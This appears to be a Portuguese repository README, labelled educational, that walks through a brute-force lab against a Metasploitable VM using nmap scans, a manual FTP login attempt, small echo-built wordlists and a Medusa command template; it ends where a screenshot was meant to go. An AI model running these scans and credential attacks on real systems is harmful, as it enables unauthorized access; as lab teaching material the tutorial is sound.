## Ataque de força bruta

‼️Este repositório tem como intuito demonstrar como um ataque de força bruta funciona e é de uso estritamente educacional.


#### Introdução 

Inicialmente começamos fazendo uma varredura com o Nmap utilizando o ip da máquina vulnerável que desejamos averiguar(Neste caso, estou utilizando o Metasploitable para testes), isso nos entregará em detalhes algumas informações importantes:

```
nmap -v <ip da máquina> 
````
 _Ferramenta utilizada (nmap), parâmetro -v (Verbose) e o ip desejado._

 Em seguida, para verificar os serviços abertos, a porta e o serviço(Os fingerprinting), usaremos: 

 ```
sudo* nmap -O <ip da máquina> 
````

Por questões de abrangência, usaremos o parâmetro -A também, que traz uma varredura mais detalhada(Mais intrusivo), com versão dos serviços e execução de scripts.

```
nmap -A <ip da máquina>
````

Também utilizei o ping -c para testes rápidos de conectividade, respostas da host.

👾 Agora que fizemos a varredura, vamos partir para a parte mais esperada: O ataque. 

Primeiro testei (Com dados frequentes usados como nome de usuário e senha), se teríamos algum acesso permitido: 

```
ftp <ip da máquina>
````

Entradas: admin (Senha e usuário)

Resposta: 

```
530 Login incorrect.
ftp: Login failed.
````

Não foi, mesmo com tentativas utilizando senhas e nomes de usuário previsíveis de forma manual.

Então vamos automatizar esse processo com wordlists: 

```
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt 
````

Criação de uma lista de nomes possíveis para combinação.

```
echo -e '123456\npassword\nqwerty\nmsfadmin' > passw.txt
````

Criação de uma lista de senhas com o mesmo intuito.

Agora vamos utilizar a ferramenta Medusa:

```
medusa -h <ip da máquina> -U <arquivo de usuários> -P <arquivo de senhas> -M <Protocolo alvo> -t <número de threads a serem executadas>
````

Segue uma imagem do terminal com a tentativa de ataque de força bruta com o wordlists:






